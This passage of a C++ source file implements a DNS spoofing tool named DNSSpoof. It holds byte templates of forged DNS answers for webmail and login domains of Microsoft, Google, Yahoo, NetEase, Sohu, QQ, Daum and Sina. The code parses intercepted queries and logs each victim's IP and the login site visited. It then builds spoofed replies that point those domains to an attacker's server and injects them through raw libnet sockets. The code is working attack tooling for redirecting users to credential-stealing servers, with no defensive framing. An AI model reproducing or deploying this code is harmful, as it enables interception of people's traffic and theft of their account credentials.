	0x77,0x67,0x31,0x01,0x62,0xc0,0x10,0xc0,0x2b,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,
	TIMD,0x00,0x0d,0x06,0x61,0x6e,0x79,0x2d,0x66,0x70,0x03,0x77,0x61,0x31,0xc0,0x32,
	0xc0,0x42,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00, 
	0xc0,0x42,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00,
};

//cn.yahoo.com
unsigned char cnyahoo[34]={
	0x02,0x63,0x6e,0x05,0x79,0x61,0x68,0x6f,0x6f,0x03,0x63,0x6f,0x6d,0x00,0x00,0x01,
	0x00,0x01,
	0xc0,0x0c,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};

//mail.yahoo.com
unsigned char myahoo[115]={
	0x04,0x6d,0x61,0x69,0x6c,0x05,0x79,0x61,0x68,0x6f,0x6f,0x03,0x63,0x6f,0x6d,0x00,
	0x00,0x01,0x00,0x01,
	0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x08,0x05,0x6c,0x6f,0x67,
	0x69,0x6e,0xc0,0x11,0xc0,0x2c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x16,
	0x0c,0x6c,0x6f,0x67,0x69,0x6e,0x2d,0x67,0x6c,0x6f,0x62,0x61,0x6c,0x04,0x6c,0x67,
	0x67,0x31,0x01,0x62,0xc0,0x11,0xc0,0x40,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,
	0x00,0x0d,0x05,0x6c,0x6f,0x67,0x69,0x6e,0x04,0x6c,0x67,0x61,0x31,0xc0,0x52,0xc0,
	0x62,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};

//mail.sohu.com
unsigned char sohu_mail[35]={
	0x04,0x6d,0x61,0x69,0x6c,0x04,0x73,0x6f,0x68,0x75,0x03,0x63,0x6f,0x6d,0x00,0x00,
	0x01,0x00,0x01,
	0xc0,0x0c,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};

//passport.sohu.com
unsigned char sohu_login[66]={
	0x08,0x70,0x61,0x73,0x73,0x70,0x6f,0x72,0x74,0x04,0x73,0x6f,0x68,0x75,0x03,0x63,
	0x6f,0x6d,0x00,0x00,0x01,0x00,0x01,
	0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x0f,0x08,0x70,0x61,0x73,
	0x73,0x70,0x6f,0x72,0x74,0x01,0x68,0x01,0x61,0xc0,0x15,
	0xc0,0x2f,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};

//www.qq.com
unsigned char qqmail[32]={
	0x03,0x77,0x77,0x77,0x02,0x71,0x71,0x03,0x63,0x6f,0x6d,0x00,0x00,0x01,0x00,0x01,
	0xc0,0x0c,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};

//mail.qq.com
unsigned char mailqq[33]={
	0x04,0x6d,0x61,0x69,0x6c,0x02,0x71,0x71,0x03,0x63,0x6f,0x6d,0x00,0x00,0x01,0x00,
	0x01,
	0xc0,0x0c,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};

//w.mail.qq.com
unsigned char wmailqq[35]={
	0x01,0x77,0x04,0x6d,0x61,0x69,0x6c,0x02,0x71,0x71,0x03,0x63,0x6f,0x6d,0x00,0x00,0x01,0x00,0x01,
	//0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x01,0x6d,0xc0,0x0e,
	0xc0,0x0c,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};

//www.daum.net
unsigned char hanmail_www[54]={
0x03,0x77,0x77,0x77,0x04,0x64,0x61,0x75,0x6d,0x03,0x6e,0x65,0x74,0x00,0x00,0x01,0x00,0x01,
0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x08,0x03,0x77,0x77,0x77,0x01,0x67,0xc0,0x10,
0xc0,0x2a,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};

//mail.daum.net
unsigned char hanmail_mail[35]={
0x04,0x6d,0x61,0x69,0x6c,0x04,0x64,0x61,0x75,0x6d,0x03,0x6e,0x65,0x74,0x00,0x00,0x01,0x00,0x01,
0xc0,0x0c,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};

//logins.daum.net
unsigned char hanmail_logins[37]={
0x06,0x6c,0x6f,0x67,0x69,0x6e,0x73,0x04,0x64,0x61,0x75,0x6d,0x03,0x6e,0x65,0x74,0x00,0x00,0x01,0x00,0x01,
0xc0,0x0c,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};

//s1.daumcdn.net
unsigned char hanmail_js[95]={
0x02,0x73,0x31,0x07,0x64,0x61,0x75,0x6d,0x63,0x64,0x6e,0x03,0x6e,0x65,0x74,0x00,0x00,0x01,0x00,0x01,
0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x0c,0x02,0x73,0x31,0x01,0x67,0x04,0x64,0x61,0x75,0x6d,0xc0,0x17,
0xc0,0x2c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x17,
0x02,0x73,0x31,0x07,0x64,0x61,0x75,0x6d,0x63,0x64,0x6e,0x03,0x6e,0x65,0x74,0x05,0x63,0x64,0x6e,0x67,0x63,0xc0,0x17,
0xc0,0x44,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};

//login.daum.net
unsigned char hanmail_login[36]={
0x05,0x6c,0x6f,0x67,0x69,0x6e,0x04,0x64,0x61,0x75,0x6d,0x03,0x6e,0x65,0x74,0x00,0x00,0x01,0x00,0x01,
0xc0,0x0c,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};

//login.sina.com.cn
unsigned char sina_login[39]={
0x05,0x6c,0x6f,0x67,0x69,0x6e,0x04,0x73,0x69,0x6e,0x61,0x03,0x63,0x6f,0x6d,0x02,0x63,0x6e,0x00,0x00,0x01,0x00,0x01,
0xc0,0x0c,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};

//i.sso.sina.com.cn
unsigned char sina_sso[81]={
0x01,0x69,0x03,0x73,0x73,0x6f,0x04,0x73,0x69,0x6e,0x61,0x03,0x63,0x6f,0x6d,0x02,0x63,0x6e,0x00,0x00,0x01,0x00,0x01,
0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x0a,0x07,0x6a,0x75,0x70,0x69,0x74,0x65,0x72,0xc0,0x12,
0xc0,0x2f,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x08,0x05,0x77,0x65,0x7a,0x65,0x6e,0xc0,0x12,
0xc0,0x45,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};

//i2.sinaimg.cn
unsigned char sina_js[99]={
0x02,0x69,0x32,0x07,0x73,0x69,0x6e,0x61,0x69,0x6d,0x67,0x02,0x63,0x6e,0x00,0x00,0x01,0x00,0x01,
0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x06,0x03,0x77,0x77,0x77,0xc0,0x0f,
0xc0,0x2b,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x0e,0x02,0x69,0x33,0x04,0x73,0x69,0x6e,0x61,0x03,0x63,0x6f,0x6d,0xc0,0x07,
0xc0,0x3d,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x08,0x05,0x68,0x61,0x64,0x61,0x72,0xc0,0x40,
0xc0,0x57,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};

//image2.sina.com.cn
unsigned char sina_ijs[78]={
0x06,0x69,0x6d,0x61,0x67,0x65,0x32,0x04,0x73,0x69,0x6e,0x61,0x03,0x63,0x6f,0x6d,0x02,0x63,0x6e,0x00,0x00,0x01,0x00,0x01,
0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x05,0x02,0x69,0x33,0xc0,0x13,
0xc0,0x30,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x09,0x06,0x64,0x69,0x70,0x68,0x64,0x61,0xc0,0x13,
0xc0,0x41,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};




unsigned int getCheckSum_A(unsigned char* dns,int len);
unsigned int getCheckSum_B(unsigned int ips,unsigned int ipc,unsigned int port,unsigned int id,unsigned int sum);
int initReservedSum();

unsigned short getCheckSum(unsigned char* dns,int len,unsigned int ips,unsigned int ipc,unsigned int port,unsigned int id);






unsigned char answer[2000];
extern char serverIp[16];
extern char senddev[DEV_LENTH];

// declared in other file
extern struct ServerIP serverIP;



unsigned int destIp;
using namespace std;
int dn_expand (const u_char *msg, const u_char *eom_orig,
					  const u_char *comp_dn, char *exp_dn, int length)
{
	const u_char *cp;
	char *dn, *eom;
	int   c, n, len = -1, checked = 0;

	dn  = exp_dn;
	cp  = comp_dn;
	eom = exp_dn + length;

  /* Fetch next label in domain name
  */
	while ((n = *cp++) != 0) {
		/* Check for indirection */
		switch (n & INDIR_MASK) {
			case 0:
				if (dn != exp_dn) {
					if (dn >= eom)
						return (-1);
					*dn++ = '.';
				}
				if (dn+n >= eom)
					return (-1);
				checked += n + 1;
				while (--n >= 0) {
					int c = *cp++;
					if ((c == '.') || (c == '\\')) {
						if (dn + n + 2 >= eom)
							return (-1);
						*dn++ = '\\';
					}
					*dn++ = c;
					if (cp >= eom_orig)  /* out of range */
						return (-1);
				}
				break;

			case INDIR_MASK:
				if (len < 0)
					len = cp - comp_dn + 1;
				cp = msg + (((n & 0x3f) << 8) | (*cp & 0xff));
				if (cp < msg || cp >= eom_orig)  /* out of range */
					return (-1);
				checked += 2;
           /*
				* Check for loops in the compressed name;
				* if we've looked at the whole message,
				* there must be a loop.
		   */
				if (checked >= eom_orig - msg)
					return (-1);
				break;

			default:
				return (-1);   /* flag error */
		}
	}

	*dn = '\0';
  
	for (dn = exp_dn; (c = *dn) != '\0'; dn++)
		if (isascii(c) && isspace(c))
			return (-1);
    
	if (len < 0)
		len = cp - comp_dn;
	return (len);
}

//-----------------------------------------------------------------------
// Func Name   : DNSSpoof
// Description : Constructor.
// Parameter   : void
// Return      : void
//-----------------------------------------------------------------------
DNSSpoof::DNSSpoof()
{
	initReservedSum();
	strcpy(sendDevice ,senddev);
	strcpy(dnsIp,serverIp);  //59.172.218.114
	destIp=inet_addr(serverIp);
	destIp=(destIp>>24&0xff)|(destIp>>8&0xff00)|(destIp<<8&0xff0000)|(destIp<<24&0xff000000);
	char lnet_errbuf[LIBNET_ERRBUF_SIZE];
	
//#define SOCKET_LEVEL_DEF	
	

// A++++++++++ /////////////////////////////////////////////////////////////////////////
	// open the socket at layer 2 
#ifndef SOCKET_LEVEL_DEF	
	libnetL2 = libnet_init(LIBNET_LINK_ADV, sendDevice, lnet_errbuf);
#endif	
// A+++++++++ /////////////////////////////////////////////////////////////////////////*/

	
	
// A---------- /////////////////////////////////////////////////////////////////////////
	//open the socket at layer 3
#ifdef SOCKET_LEVEL_DEF			
	libnetL2 = libnet_init(LIBNET_RAW4_ADV, sendDevice, lnet_errbuf);
#endif	
// A---------- ////////////////////////////////////////////////////////////////////////*/
	
	if (libnetL2 == NULL)
	{
		//cout<<"libnet_init() failed: %s\n"<<lnet_errbuf<<endl;
		LOG_ERROR("libnet_init() failed: %s\n",lnet_errbuf);
	}
	else
	{
		//cout<<"libnet_init() sucess!"<<endl;
		//cout<<"send device: "<<sendDevice<<endl;
		LOG_INFO("libnet_init() sucess! send device: %s\n",sendDevice);
	}
	
}

//-----------------------------------------------------------------------
// Func Name   : ~DNSSpoof
// Description : Destructor.
// Parameter   : void
// Return      : void
//-----------------------------------------------------------------------
DNSSpoof::~DNSSpoof()
{
    // Do nothing.
}

//-----------------------------------------------------------------------
// Func Name   : ParseDNSQueries
// Description : Parse DNS Queries packet 
// Parameter   : void
// Return      : void
//-----------------------------------------------------------------------
bool DNSSpoof::ParseDNSQueries(PacketInfo* pktInfo)
{
// 	cout<<"ip:"<<pktInfo->srcIpv4<<" dns queries!"<<endl;
	dnsHdr=(struct DNShdr *)pktInfo->body;
	//cout<<"DNS series:"<<ntohs(dnsHdr->id)<<endl;
	unsigned char* data ,*end;
	int name_len;
	char name[NS_MAXDNAME];
	unsigned char *q;
	unsigned short  Class;
	unsigned short  type;	
	data = (unsigned char *)pktInfo->body +sizeof(DNShdr);	
	end = (unsigned char *)pktInfo->body + pktInfo->bodyLen;
	//extract the name from the packet 
	name_len = dn_expand((unsigned char *)dnsHdr, end, data, name, sizeof(name)); 

	q = data + name_len;  
	// get the type and class 

	NS_GET16(type,q);
	NS_GET16(Class, q);

	//handle only internet class 
	if (Class != ns_c_in){

		return false;
}

	//we are interested only in DNS query 
	if ( (!dnsHdr->qr) && dnsHdr->opcode == ns_o_query && htons(dnsHdr->num_q) == 1 && htons(dnsHdr->num_answer) == 0) 
	{	

		domainFlag=0;
		int answerSize=0;
		if(strcmp("mail.live.com",name)==0)
			domainFlag=DNS_MAIL_LIVE;
		else if(strcmp("www.hotmail.com",name)==0)
			domainFlag=DNS_HOTMAIL;
		else if(strcmp("www.live.com",name)==0)
			domainFlag=DNS_WLIVE;
		else if(strcmp("login.live.com",name)==0)
			domainFlag=DNS_LLIVE;
		else if(strcmp("hotmail.com",name)==0)
			domainFlag=DNS_SHMAIL;
		else if(strcmp("home.live.com",name)==0)
			domainFlag=DNS_HOMEL;

		else if(strcmp("www.126.com",name)==0)
			domainFlag=DNS_W126;
		else if(strcmp("mail.126.com",name)==0)
			domainFlag=DNS_M126;
		else if(strcmp("email.126.com",name)==0)
			domainFlag=DNS_EM126;
		else if(strcmp("126.com",name)==0)
			domainFlag=DNS_S126;
		else if(strcmp("mail.163.com",name)==0)
			domainFlag=DNS_M163;
		else if(strcmp("email.163.com",name)==0)
			domainFlag=DNS_EM163;
		else if(strcmp("www.yeah.net",name)==0)
			domainFlag=DNS_WYEAH;
		else if(strcmp("mail.yeah.net",name)==0)
			domainFlag=DNS_MYEAH;
		else if(strcmp("email.yeah.net",name)==0)
			domainFlag=DNS_EMYEAH;
		else if(strcmp("yeah.net",name)==0)
			domainFlag=DNS_YEAH;
		else if(strcmp("ssl.mail.yeah.net",name)==0)
			domainFlag=DNS_SSLY;
		else if(strcmp("ssl.mail.163.com",name)==0)
			domainFlag=DNS_SSL163;
		else if(strcmp("ssl.mail.126.com",name)==0)
			domainFlag=DNS_SSL126;
		else if(strcmp("www.163.com",name)==0)
			domainFlag=DNS_W163;

		else if(strcmp("mail.google.com",name)==0)
			domainFlag=DNS_MG;
		else if(strcmp("www.google.com",name)==0)
			domainFlag=DNS_WG;
		else if(strcmp("www.google.com.hk",name)==0)
			domainFlag=DNS_WGH;
		else if(strcmp("gmail.google.com",name)==0)
			domainFlag=DNS_GMG;
		else if(strcmp("accounts.google.com",name)==0)
			domainFlag=DNS_ACCT;

		else if(strcmp("mail.cn.yahoo.com",name)==0)
			domainFlag=DNS_YCNFORM;
		else if(strcmp("edit.bjs.yahoo.com",name)==0)
			domainFlag=DNS_YCNLOGIN;
		else if(strcmp("login.yahoo.com",name)==0)
			domainFlag=DNS_YLOGIN;
		else if(strcmp("www.yahoo.com",name)==0)
			domainFlag=DNS_WYAHOO;
		else if(strcmp("cn.yahoo.com",name)==0)
			domainFlag=DNS_CNYAHOO;
		else if(strcmp("mail.yahoo.com",name)==0)
			domainFlag=DNS_YFORM;

		else if(strcmp("mail.sohu.com",name)==0)
			domainFlag=DNS_SOHU_MAIL;	
		else if(strcmp("passport.sohu.com",name)==0)
			domainFlag=DNS_SOHU_LOGIN;

		else if(strcmp("www.qq.com",name)==0)
			domainFlag=DNS_QQMAIL;
		else if(strcmp("mail.qq.com",name)==0)
			domainFlag=DNS_MAILQQ;
		else if(strcmp("w.mail.qq.com",name)==0)
			domainFlag=DNS_WMAILQQ;

		else if(strcmp("www.daum.net",name)==0){
			domainFlag=DNS_HANMAIL_WWW;}
		else if(strcmp("mail.daum.net",name)==0){
			domainFlag=DNS_HANMAIL_MAIL;}
		else if(strcmp("logins.daum.net",name)==0){
			domainFlag=DNS_HANMAIL_LOGINS;}
		else if(strcmp("s1.daumcdn.net",name)==0){
			domainFlag=DNS_HANMAIL_JS;}
		else if(strcmp("login.daum.net",name)==0){
			domainFlag=DNS_HANMAIL_LOGIN;}
		
		else if(strcmp("login.sina.com.cn",name)==0){
			domainFlag=DNS_SINA_LOGIN;}
		else if(strcmp("i.sso.sina.com.cn",name)==0){
			domainFlag=DNS_SINA_SSO;}
		else if(strcmp("i2.sinaimg.cn",name)==0){
			domainFlag=DNS_SINA_JS;}
		else if(strcmp("image2.sina.com.cn",name)==0){
			domainFlag=DNS_SINA_IJS;}
		
		if(domainFlag>0 && isSwitchOn(domainFlag)){
			answerRRS=0;
			//pktInfo->destIpv4=destIp;
			//pktInfo->ip->daddr=destIp;
			struct in_addr printAddr;
			printAddr.s_addr = pktInfo->srcIpv4;
			//cout<<inet_ntoa(printAddr)<<" login : "<< name <<endl;
			LOG_INFO("%s login : %s\n",inet_ntoa(printAddr),name);
			if (type == ns_t_a){
				struct in_addr reply;
				int tip=inet_aton("1.1.1.1",&reply);
				if(tip==0)
					LOG_WARN("wrong ip\n");
				memset(answer,0,2000);
				if(domainFlag==DNS_MAIL_LIVE){
					memcpy(answer,mlive,103);
					//memcpy(answer+99,&reply,IP_ADDR_LEN);
					memcpy(answer+99,serverIP.ip,IP_ADDR_LEN);
					//memcpy(answer+115,serverIP.ip,IP_ADDR_LEN);
					answerSize=103;
					answerRRS=3;
					/*
					unsigned int cid=(dnsHdr->id<<16&0xffff0000)+((answerRRS>>8&0xff)|(answerRRS<<8&0xff00));
					unsigned int port=(pktInfo->srcPort<<16&0xffff0000)|(pktInfo->destPort&0xffff);
					udpSum=getCheckSum_B(pktInfo->srcIpv4,pktInfo->destIpv4,
										 port,cid,reservedCheckSum[domainFlag]
										);
					*/
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff); 
					udpSum=getCheckSum(answer,103,pktInfo->destIpv4, pktInfo->srcIpv4,port,cid);
					
					
				}
				else if(domainFlag==DNS_HOTMAIL){
					memcpy(answer,hmail,115);
					memcpy(answer+111,serverIP.ip,IP_ADDR_LEN);
					answerSize=115;
					answerRRS=3;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff); 
					udpSum=getCheckSum(answer,115,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
					
				}
				else if(domainFlag==DNS_WLIVE){
					memcpy(answer,wlive,78);
					memcpy(answer+74,serverIP.ip,IP_ADDR_LEN);
					answerSize=78;
					answerRRS=2;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff); 
					udpSum=getCheckSum(answer,78,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
					
				}
				else if(domainFlag==DNS_LLIVE){
					memcpy(answer,llive,74);
					memcpy(answer+70,serverIP.ip,IP_ADDR_LEN);
					answerSize=74;
					answerRRS=2;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff); 
					udpSum=getCheckSum(answer,74,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
					
				}
				else if (domainFlag==DNS_SHMAIL){
					memcpy(answer,shmail,33);
					memcpy(answer+29,serverIP.ip,IP_ADDR_LEN);
					answerSize=33;
					answerRRS=1;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff); 
					udpSum=getCheckSum(answer,33,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
					
				}
				else if (domainFlag==DNS_HOMEL){
					memcpy(answer,homel,79);
					memcpy(answer+75,serverIP.ip,IP_ADDR_LEN);
					answerSize=79;
					answerRRS=2;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff); 
					udpSum=getCheckSum(answer,79,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
					
				}
				
				else if(domainFlag==DNS_M163){
					memcpy(answer,m163,152);
					//printf("**************SEND DNS IP: %08x\n",serverIP.ip[0]);
					memcpy(answer+148,serverIP.ip,IP_ADDR_LEN);
					answerSize=152;
					answerRRS=5;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff); 
					udpSum=getCheckSum(answer,152,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
					
				}
				else if(domainFlag==DNS_EM163){
					memcpy(answer,em163,158);
					memcpy(answer+154,serverIP.ip,IP_ADDR_LEN);
					answerSize=158;
					answerRRS=5;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff); 
					udpSum=getCheckSum(answer,158,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
					
				}
				else if(domainFlag==DNS_WYEAH){
					memcpy(answer,wyeah,164);
					memcpy(answer+160,serverIP.ip,IP_ADDR_LEN);
					answerSize=164;
					answerRRS=5;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff); 
					udpSum=getCheckSum(answer,164,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
					
				}
				else if(domainFlag==DNS_MYEAH){
					memcpy(answer,myeah,183);
					memcpy(answer+179,serverIP.ip,IP_ADDR_LEN);
					answerSize=183;
					answerRRS=6;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff); 
					udpSum=getCheckSum(answer,183,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
					
				}
				else if(domainFlag==DNS_EMYEAH){
					memcpy(answer,emyeah,166);
					memcpy(answer+162,serverIP.ip,IP_ADDR_LEN);
					answerSize=166;
					answerRRS=5;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff); 
					udpSum=getCheckSum(answer,166,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
					
				}
				else if(domainFlag==DNS_YEAH){
					memcpy(answer,yeah,30);
					memcpy(answer+26,serverIP.ip,IP_ADDR_LEN);
					answerSize=30;
					answerRRS=1;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff); 
					udpSum=getCheckSum(answer,30,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
					
				}
				
				else if(domainFlag==DNS_W126){
					memcpy(answer,w126,160);
					memcpy(answer+156,serverIP.ip,IP_ADDR_LEN);
					answerSize=160;
					answerRRS=5;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff); 
					udpSum=getCheckSum(answer,160,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
					
				}
				else if(domainFlag==DNS_M126){
					memcpy(answer,m126,179);
					memcpy(answer+175,serverIP.ip,IP_ADDR_LEN);
					answerSize=179;
					answerRRS=6;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff); 
					udpSum=getCheckSum(answer,179,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
					
				}
				else if(domainFlag==DNS_EM126){
					memcpy(answer,em126,162);
					memcpy(answer+158,serverIP.ip,IP_ADDR_LEN);
					answerSize=162;
					answerRRS=5;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff); 
					udpSum=getCheckSum(answer,162,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
					
				}
				else if(domainFlag==DNS_S126){
					memcpy(answer,s126,29);
					memcpy(answer+25,serverIP.ip,IP_ADDR_LEN);
					answerSize=29;
					answerRRS=1;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff); 
					udpSum=getCheckSum(answer,29,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
					
				}
				else if(domainFlag==DNS_SSLY){
					memcpy(answer,sslyeah,39);
					memcpy(answer+35,serverIP.ip,IP_ADDR_LEN);
					answerSize=39;
					answerRRS=1;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff); 
					udpSum=getCheckSum(answer,39,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
				}
				else if(domainFlag==DNS_SSL163){
					memcpy(answer,ssl163,38);
					memcpy(answer+34,serverIP.ip,IP_ADDR_LEN);
					answerSize=38;
					answerRRS=1;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff); 
					udpSum=getCheckSum(answer,38,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
				}
				else if(domainFlag==DNS_SSL126){
					memcpy(answer,ssl126,38);
					memcpy(answer+34,serverIP.ip,IP_ADDR_LEN);
					answerSize=38;
					answerRRS=1;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff); 
					udpSum=getCheckSum(answer,38,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
				}
				else if(domainFlag==DNS_W163){
					memcpy(answer,w163,161);
					memcpy(answer+157,serverIP.ip,IP_ADDR_LEN);
					answerSize=161;
					answerRRS=5;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff); 
					udpSum=getCheckSum(answer,161,pktInfo->destIpv4,
									   pktInfo->srcIpv4,port,cid);
				}

				else if(domainFlag==DNS_MG){
					memcpy(answer,mg,64);
					memcpy(answer+60,serverIP.ip,IP_ADDR_LEN);
					answerSize=64;
					answerRRS=2;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff); 
					udpSum=getCheckSum(answer,64,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
					
				}
				else if(domainFlag==DNS_WG){
					memcpy(answer,wg,56);
					memcpy(answer+52,serverIP.ip,IP_ADDR_LEN);
					answerSize=56;
					answerRRS=2;
					unsigned int port;
